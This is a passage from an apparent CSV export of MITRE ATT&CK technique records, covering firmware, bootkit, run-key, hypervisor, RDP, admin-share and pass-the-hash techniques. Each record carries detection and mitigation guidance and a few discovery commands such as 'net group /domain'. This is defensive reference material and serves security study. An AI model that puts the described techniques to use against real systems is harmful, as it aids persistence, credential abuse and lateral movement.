'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],[],"['Defense Evasion', 'Persistence']",Technique/T1108,['Redundant Access'],https://attack.mitre.org/wiki/Technique/T1108
1562,[],"['Anti-virus', 'File monitoring', 'Host intrusion prevention systems']",[],[],[],"['Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [[Technique/T1019|System Firmware]] but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.']",[],[],[],[],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['SYSTEM'],['Ability to update component device firmware from the host operating system.'],[],"['Defense Evasion', 'Persistence']",Technique/T1109,['Component Firmware'],https://attack.mitre.org/wiki/Technique/T1109
1563,['Detection of execution through the GUI will likely lead to significant false positives. Other factors should be considered to detect misuse of services that can lead to adversaries gaining access to systems through interactive remote sessions. \n\nUnknown or unusual process launches outside of normal behavior on a particular system occurring through remote interactive sessions are suspicious. Collect and audit security logs that may indicate access to and use of [[Legitimate Credentials]] to access remote systems within the network.'],[],[],[],"['File monitoring', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']",['Cause a binary or script to execute based on interacting with the file through a graphical user interface (GUI) or in an interactive remote session such as [[Technique/T1076|Remote Desktop Protocol]].'],[],[],[],"['Prevent adversaries from gaining access to credentials through [[Credential Access]] that can be used to log into remote desktop sessions on systems.\n\nIdentify unnecessary system utilities, third-party tools, or potentially malicious software that may be used to log into remote interactive sessions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] and Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],[],['Execution'],Technique/T1061,['Graphical User Interface'],https://attack.mitre.org/wiki/Technique/T1061
1564,"[""Monitor Registry for changes to run keys that do not correlate with known software, patch cycles, etc. Monitor the start folder for additions or changes. Tools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the run keys' Registry locations and startup folders.[[CiteRef::TechNet Autoruns]] Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.\n\nChanges to these locations typically happen under normal conditions when legitimate software is installed. To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for [[Command and Control]], learning details about the environment through [[Discovery]], and [[Lateral Movement]].""]",[],['270'],[],"['Windows Registry', 'File monitoring']","['Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.[[CiteRef::Microsoft Run Key]] The program will be executed under the context of the user and will have the account\'s associated permissions level.\n\nAdversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [[Technique/T1036|Masquerading]] to make the Registry entries look as if they are associated with legitimate programs.']",[],[],[],['Identify and block potentially malicious software that may be executed through run key or startup folder persistence using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Persistence'],Technique/T1060,['Registry Run Keys / Start Folder'],https://attack.mitre.org/wiki/Technique/T1060
1565,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process command-line parameters', 'Process monitoring']","[""Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules, anti-virus, and virtualization. These checks may be built into early-stage remote access tools.\n\n===Windows===\n\nExample commands that can be used to obtain security software information are [[Software/S0108|netsh]], <code>reg query</code> with [[Software/S0075|Reg]], <code>dir</code> with [[Software/S0106|cmd]], and [[Software/S0057|Tasklist]], but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.\n\n===Mac===\n\nIt's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.""]",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about local security software, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']",[],[],['Discovery'],Technique/T1063,['Security Software Discovery'],https://attack.mitre.org/wiki/Technique/T1063
1566,"['Type-1 hypervisors may be detected by performing timing analysis. Hypervisors emulate certain CPU instructions that would normally be executed by the hardware. If an instruction takes orders of magnitude longer to execute than normal on a system that should not contain a hypervisor, one may be present.[[CiteRef::virtualization.info 2006]]']",[],['552'],[],['System calls'],"[""A type-1 hypervisor is a software layer that sits between the guest operating systems and system's hardware.[[CiteRef::Wikipedia Hypervisor]] It presents a virtual running environment to an operating system. An example of a common hypervisor is Xen.[[CiteRef::Wikipedia Xen]] A type-1 hypervisor operates at a level below the operating system and could be designed with [[Technique/T1014|Rootkit]] functionality to hide its existence from the guest operating system.[[CiteRef::Myers 2007]] A malicious hypervisor of this nature could be used to persist on systems through interruption.""]",[],[],[],['Prevent adversary access to privileged accounts necessary to install a hypervisor.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['Administrator', 'SYSTEM']",[],[],['Persistence'],Technique/T1062,['Hypervisor'],https://attack.mitre.org/wiki/Technique/T1062
1567,"['Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Netflow/Enclave netflow', 'Process use of network', 'Process monitoring']",['Adversaries may conduct C2 communications over a non-standard port to bypass proxies and firewalls that have been improperly configured.'],[],[],[],"['Properly configure firewalls and proxies to limit outgoing traffic to only necessary ports. \n\nNetwork intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1065,['Uncommonly Used Port'],https://attack.mitre.org/wiki/Technique/T1065
1568,"['Scripting may be common on admin, developer, or power user systems, depending on job function. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.\n\nScripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [[Discovery]], [[Collection]], or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.']",['Process whitelisting'],[],[],"['Process monitoring', 'File monitoring', 'Process command-line parameters']","['Adversaries may use scripts to aid in operations and perform multiple actions that would otherwise be manual. Scripting is useful for speeding up operational tasks and reducing the time required to gain access to critical resources. Some scripting languages may be used to bypass process monitoring mechanisms by directly interacting with the operating system at an API level instead of calling other programs. Common scripting languages for Windows include VBScript and PowerShell but could also be in the form of command-line batch scripts.\n\nMany popular offensive frameworks exist which use forms of scripting for security testers and adversaries alike. Metasploit[[CiteRef::Metasploit]], Veil[[CiteRef::Veil]], and PowerSploit[[CiteRef::Powersploit]] are three examples that are popular among penetration testers for exploit and post-compromise operations and include many features for evading defenses. Some adversaries are known to use PowerShell.[[CiteRef::Alperovitch 2014]]']",[],[],[],['Turn off unused features or restrict access to scripting engines such as VBScript or scriptable administration frameworks such as PowerShell.'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],"['Defense Evasion', 'Execution']",Technique/T1064,['Scripting'],https://attack.mitre.org/wiki/Technique/T1064
1569,['Perform integrity checking on MBR and VBR. Take snapshots of MBR and VBR and compare against known good samples. Report changes to MBR and VBR as they occur for indicators of suspicious activity and further analysis.'],[],[],[],"['API monitoring', 'MBR', 'VBR']","['A bootkit is a malware variant that modifies the boot sectors of a hard drive, including the Master Boot Record (MBR) and Volume Boot Record (VBR).[[CiteRef::MTrends 2016]]\n\nAdversaries may use bootkits to persist on systems at a layer below the operating system, which may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.\n\n===Master Boot Record===\nThe MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.[[CiteRef::Lau 2011]]\n\n===Volume Boot Record===\nThe MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.']",[],[],[],['Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform this action. Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised.[[CiteRef::TCG Trusted Platform Module]][[CiteRef::TechNet Secure Boot Process]]'],"['Linux', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']","['Administrator', 'SYSTEM']",[],[],['Persistence'],Technique/T1067,['Bootkit'],https://attack.mitre.org/wiki/Technique/T1067
1570,"['The first detection of a malicious tool may trigger an anti-virus or other security tool alert. Similar events may also occur at the boundary through network IDS, email scanning appliance, etc. The initial detection should be treated as an indication of a potentially more invasive intrusion. The alerting system should be thoroughly investigated beyond that initial alert for activity that was not detected. Adversaries may continue with an operation, assuming that individual events like an anti-virus detect will not be investigated or that an analyst will not be able to conclusively link that event to other activity occurring on the network.']","['Anti-virus', 'Log analysis', 'Host intrusion prevention systems']",[],[],"['Process use of network', 'Anti-virus', 'Binary file metadata', 'Process command-line parameters', 'Process monitoring']","[""If a malicious tool is detected and quarantined or otherwise curtailed, an adversary may be able to determine why the malicious tool was detected (the indicator), modify the tool by removing the indicator, and use the updated version that is no longer detected by the target's defensive systems or subsequent targets that may use similar systems.\n\nA good example of this is when malware is detected with a file signature and quarantined by anti-virus software. An adversary who can determine that the malware was quarantined because of its file signature may use [[Technique/T1045|Software Packing]] or otherwise modify the file so it has a different signature, and then re-use the malware.""]",[],[],[],['Mitigation is difficult in instances like this because the adversary may have access to the system through another channel and can learn what techniques or tools are blocked by resident defenses. Exercising best practices with configuration and security as well as ensuring that proper process is followed during investigation of potential compromise is essential to detecting a larger intrusion through discrete alerts.\n\nIdentify and block potentially malicious software that may be used by an adversary by using whitelisting[[CiteRef::Beechey 2010]] tools like AppLocker[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]'],"['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Defense Evasion'],Technique/T1066,['Indicator Removal from Tools'],https://attack.mitre.org/wiki/Technique/T1066
1571,"['System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as [[Lateral Movement]], based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],['576'],[],"['API monitoring', 'Process command-line parameters', 'Process monitoring']","['Adversaries may attempt to find local system or domain-level groups and permissions settings. \n\n===Windows===\n\nExamples of commands that can list groups are <code>net group /domain</code> and <code>net localgroup</code> using the [[Software/S0039|Net]] utility.\n\n===Mac===\n\nOn Mac, this same thing can be accomplished with the <code>dscacheutil -q group</code> for the domain, or <code>dscl . -list /Groups</code> for local groups.\n\n===Linux===\n\nOn Linux, local groups can be enumerated with the <code>groups</code> command and domain groups via the <code>ldapsearch</code> command.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to acquire information about groups and permissions, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Linux', 'MacOS', 'OS X', 'Windows 10', 'Windows 7', 'Windows 8', 'Windows 8.1', 'Windows Server 2003', 'Windows Server 2003 R2', 'Windows Server 2008', 'Windows Server 2008 R2', 'Windows Server 2012', 'Windows Server 2012 R2', 'Windows Vista', 'Windows XP']",['User'],[],[],['Discovery'],Technique/T1069,['Permission Groups Discovery'],https://attack.mitre.org/wiki/Technique/T1069
1572,"['Software exploits may not always succeed or may cause the exploited process to become unstable or crash. Software and operating system crash reports may contain useful contextual information about attempted exploits that correlate with other malicious activity. Exploited processes may exhibit behavior that is unusual for the specific process, such as spawning additional processes or reading and writing to files.']","['Anti-virus', 'System access controls']",['69'],"['John Lambert, Microsoft Threat Intelligence Center']","['Windows Error Reporting', 'File monitoring', 'Process monitoring']","['Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Exploiting software vulnerabilities may allow adversaries to run a command or binary on a remote system for lateral movement, escalate a current process to a higher privilege level, or bypass security mechanisms. Exploits may also allow an adversary access to privileged accounts and credentials. One example of this is MS14-068, which can be used to forge Kerberos tickets using domain user permissions.[[CiteRef::Technet MS14-068]][[CiteRef::ADSecurity Detecting Forged Tickets]]']",[],[],[],"['Update software regularly by employing patch management for internal enterprise endpoints and servers. Develop a robust cyber threat intelligence capability to determine what types and levels of threat may use software exploits and 0-days against a particular organization. Make it difficult for adversaries to advance their operation through exploitation of undiscovered or unpatched vulnerabilities by using sandboxing, virtualization, and exploit prevention tools such as the Microsoft Enhanced Mitigation Experience Toolkit.[[CiteRef::SRD EMET]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator', 'SYSTEM']","['Unpatched software or otherwise vulnerable target. Depending on the target and goal, the system and exploitable service may need to be remotely accessible from the internal network. In the case of privilege escalation, the adversary likely already has user permissions on the target system.']",[],"['Credential Access', 'Defense Evasion', 'Lateral Movement', 'Privilege Escalation']",Technique/T1068,['Exploitation of Vulnerability'],https://attack.mitre.org/wiki/Technique/T1068
1573,"['Configure robust, consistent account activity audit policies across the enterprise.[[CiteRef::TechNet Audit Policy]] Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).\n\nPerform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence.']","['Anti-virus', 'Firewall', 'Host intrusion prevention systems', 'Network intrusion detection system', 'Process whitelisting', 'System access controls']",['560'],[],"['Authentication logs', 'Process monitoring']","['Adversaries may steal the credentials of a specific user or service account using [[Credential Access]] techniques. Compromised credentials may be used to bypass access controls placed on various resources on hosts and within the network and may even be used for persistent access to remote systems. Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.\n\nAdversaries may also create accounts, sometimes using pre-defined account names and passwords, as a means for persistence through backup access in case other means are unsuccessful. \n\nThe overlap of credentials and permissions across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.[[CiteRef::TechNet Credential Theft]]']",[],[],[],"['Take measures to detect or prevent techniques such as [[Technique/T1003|Credential Dumping]] or installation of keyloggers to acquire credentials through [[Technique/T1056|Input Capture]]. Limit credential overlap across systems to prevent access if account credentials are obtained. Ensure that local administrator accounts have complex, unique passwords across all systems on the network. Do not put user or admin domain accounts in the local administrator groups across systems unless they are tightly controlled and use of accounts is segmented, as this is often equivalent to having a local administrator account with the same password on all systems. Follow best practices for design and administration of an enterprise network to limit privileged account use across administrative tiers.[[CiteRef::Microsoft Securing Privileged Access]]. Audit domain and local accounts as well as their permission levels routinely to look for situations that could allow an adversary to gain wide access by obtaining credentials of a privileged account.[[CiteRef::TechNet Credential Theft]][[CiteRef::TechNet Least Privilege]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']","['User', 'Administrator']",[],[],"['Defense Evasion', 'Persistence', 'Privilege Escalation']",Technique/T1078,['Valid Accounts'],https://attack.mitre.org/wiki/Technique/T1078
1574,"['If malware uses [[Technique/T1032|Standard Cryptographic Protocol]], SSL/TLS inspection can be used to detect command and control traffic within some encrypted communication channels.[[CiteRef::SANS Decrypting SSL]] SSL/TLS inspection does come with certain risks that should be considered before implementing to avoid potential security issues such as incomplete certificate validation.[[CiteRef::SEI SSL Inspection Risks]] After SSL/TLS inspection, additional cryptographic analysis may be needed to analyze the second layer of encryption.\n\nWith [[Technique/T1024|Custom Cryptographic Protocol]], if malware uses encryption with symmetric keys, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.[[CiteRef::Fidelis DarkComet]]\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.[[CiteRef::University of Birmingham C2]]']",[],[],[],"['Packet capture', 'Process use of network', 'Malware reverse engineering', 'Process monitoring']","['An adversary performs C2 communications using multiple layers of encryption, typically (but not exclusively) tunneling a custom encryption scheme within a protocol encryption scheme such as HTTPS or SMTPS.']",[],[],[],"['Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Use of encryption protocols may make typical network-based C2 detection more difficult due to a reduced ability to signature the traffic. Prior knowledge of adversary C2 infrastructure may be useful for domain and IP address blocking, but will likely not be an effective long-term solution because adversaries can change infrastructure often.[[CiteRef::University of Birmingham C2]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Command and Control'],Technique/T1079,['Multilayer Encryption'],https://attack.mitre.org/wiki/Technique/T1079
1575,"['Use of RDP may be legitimate, depending on the network environment and how it is used. Other factors, such as access patterns and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP. Monitor for user accounts logged into systems they would not normally access or access patterns to multiple systems over a relatively short period of time.']",[],['555'],[],"['Authentication logs', 'Netflow/Enclave netflow', 'Process monitoring']",['Remote desktop is a common feature in operating systems. It allows a user to log into an interactive session with a system desktop graphical user interface on a remote system. Microsoft refers to its implementation of the Remote Desktop Protocol (RDP) as Remote Desktop Services (RDS).[[CiteRef::TechNet Remote Desktop Services]] There are other implementations and third-party tools that provide graphical access [[Technique/T1021|Remote Services]] similar to RDS.\n\nAdversaries may connect to a remote system over RDP/RDS to expand access if the service is enabled and allows access to accounts with known credentials. Adversaries will likely use [[Credential Access]] techniques to acquire credentials to use with RDP. Adversaries may also use RDP in conjunction with the [[Technique/T1015|Accessibility Features]] technique for [[Persistence]].[[CiteRef::Alperovitch Malware]]'],[],[],[],"['Disable the RDP service if it is unnecessary, remove unnecessary accounts and groups from Remote Desktop Users groups, and enable firewall rules to block RDP traffic between network security zones. Audit the Remote Desktop Users group membership regularly. Remove the local Administrators group from the list of groups allowed to log in through RDP. Limit remote user permissions if remote access is necessary. Use remote desktop gateways and multifactor authentication for remote logins.[[CiteRef::Berkley Secure]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Remote Desktop Users']","['RDP service enabled, account in the Remote Desktop Users group.']",[],['Lateral Movement'],Technique/T1076,['Remote Desktop Protocol'],https://attack.mitre.org/wiki/Technique/T1076
1576,"['Ensure that proper logging of accounts used to log into systems is turned on and centrally collected. Windows logging is able to collect success/failure for accounts that may be used to move laterally and can be collected using tools such as Windows Event Forwarding.[[CiteRef::Lateral Movement Payne]][[CiteRef::Windows Event Forwarding Payne]] Monitor remote login events and associated SMB activity for file transfers and remote process execution. Monitor the actions of remote users who connect to administrative shares. Monitor for use of tools and commands to connect to remote shares, such as [[Software/S0039|Net]], on the command-line interface and [[Discovery]] techniques that could be used to find remotely accessible systems.']",[],['561'],[],"['Process use of network', 'Authentication logs', 'Process command-line parameters', 'Process monitoring']","['Windows systems have hidden network shares that are accessible only to administrators and provide the ability for remote file copy and other administrative functions. Example network shares include <code>C$</code>, <code>ADMIN$</code>, and <code>IPC$</code>. \n\nAdversaries may use this technique in conjunction with administrator-level [[Technique/T1078|Valid Accounts]] to remotely access a networked system over server message block (SMB)[[CiteRef::Wikipedia SMB]] to interact with systems using remote procedure calls (RPCs),[[CiteRef::TechNet RPC]] transfer files, and run transferred binaries through remote [[Execution]]. Example execution techniques that rely on authenticated sessions over SMB/RPC are [[Technique/T1053|Scheduled Task]], [[Technique/T1035|Service Execution]], and [[Technique/T1047|Windows Management Instrumentation]]. Adversaries can also use NTLM hashes to access administrator shares on systems with [[Technique/T1075|Pass the Hash]] and certain configuration and patch levels.[[CiteRef::Microsoft Admin Shares]]\n\nThe [[Software/S0039|Net]] utility can be used to connect to Windows admin shares on remote systems using <code>net use</code> commands with valid credentials.[[CiteRef::Technet Net Use]]']",[],[],[],"['Do not reuse local administrator account passwords across systems. Ensure password complexity and uniqueness such that the passwords cannot be cracked or guessed. Deny remote use of local admin credentials to log into systems. Do not allow domain user accounts to be in the local Administrators group multiple systems.\n\nIdentify unnecessary system utilities or potentially malicious software that may be used to leverage SMB and the Windows admin shares, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",['Administrator'],['File and printer sharing over SMB enabled.\nHost/network firewalls not blocking SMB ports between source and destination.\nUse of domain account in administrator group on remote system or default system admin account.'],[],['Lateral Movement'],Technique/T1077,['Windows Admin Shares'],https://attack.mitre.org/wiki/Technique/T1077
1577,"['Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files.\n\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [[Technique/T1047|Windows Management Instrumentation]] and [[Technique/T1086|PowerShell]].']",[],[],[],"['File monitoring', 'Process monitoring', 'Process command-line parameters']","['Collected data is staged in a central location or directory prior to [[Exfiltration]]. Data may be kept in separate files or combined into one file through techniques such as [[Technique/T1002|Data Compressed]] or [[Technique/T1022|Data Encrypted]].\n\nInteractive command shells may be used, and common functionality within [[Software/S0106|cmd]] and bash may be used to copy data into a staging location.']",[],[],[],"['Identify unnecessary system utilities or potentially malicious software that may be used to collect data from removable media, and audit and/or block them by using whitelisting[[CiteRef::Beechey 2010]] tools, like AppLocker,[[CiteRef::Windows Commands JPCERT]][[CiteRef::NSA MS AppLocker]] or Software Restriction Policies[[CiteRef::Corio 2008]] where appropriate.[[CiteRef::TechNet Applocker vs SRP]]']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Linux', 'Windows 10', 'MacOS', 'OS X']",[],[],[],['Collection'],Technique/T1074,['Data Staged'],https://attack.mitre.org/wiki/Technique/T1074
1578,['Audit all logon and credential use events and review for discrepancies. Unusual remote logins that correlate with other suspicious activity (such as writing and executing binaries) may indicate malicious activity. NTLM LogonType 3 authentications that are not associated to a domain login and are not anonymous logins are suspicious.'],[],[],[],['Authentication logs'],"[""Pass the hash (PtH)[[CiteRef::Aorato PTH]] is a method of authenticating as a user without having access to the user's cleartext password. This method bypasses standard authentication steps that require a cleartext password, moving directly into the portion of the authentication that uses the password hash. In this technique, valid password hashes for the account being used are captured using a [[Credential Access]] technique. Captured hashes are used with PtH to authenticate as that user. Once authenticated, PtH may be used to perform actions on local or remote systems. \n\nWindows 7 and higher with KB2871997 require valid domain user credentials or RID 500 administrator hashes.[[CiteRef::NSA Spotting]]""]",[],[],[],"[""Monitor systems and domain logs for unusual credential logon activity. Prevent access to [[Technique/T1078|Valid Accounts]]. Apply patch KB2871997 to Windows 7 and higher systems to limit the default access of accounts in the local administrator group. Limit credential overlap across systems to prevent the damage of credential compromise and reduce the adversary's ability to perform [[Lateral Movement]] between systems. Ensure that built-in and created local administrator accounts have complex, unique passwords. Do not allow a domain user to be in the local administrator group on multiple systems.""]","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']",[],['Requires Microsoft Windows as target system'],[],['Lateral Movement'],Technique/T1075,['Pass the Hash'],https://attack.mitre.org/wiki/Technique/T1075
1579,"['Detection methods will vary depending on the type of third-party software or system and how it is typically used. \n\nThe same investigation process can be applied here as with other potentially malicious activities where the distribution vector is initially unknown but the resulting activity follows a discernible pattern. Analyze the process execution trees, historical activities from the third-party application (such as what types of files are usually pushed), and the resulting activities or events from the file/binary/script pushed to systems. \n\nOften these third-party applications will have logs of their own that can be collected and correlated with other data from the environment. Audit software deployment logs and look for suspicious or unauthorized activity. A system not typically used to push software to clients that suddenly is used for such a task outside of a known admin function may be suspicious.\n\nPerform application deployment at regular times so that irregular deployment activity stands out. Monitor process activity that does not correlate to known good software. Monitor account login activity on the deployment system.']",[],[],[],"['Binary file metadata', 'File monitoring', 'Process monitoring', 'Process use of network', 'Third-party application logs', 'Windows Registry']","['Third-party applications and software deployment systems may be in use in 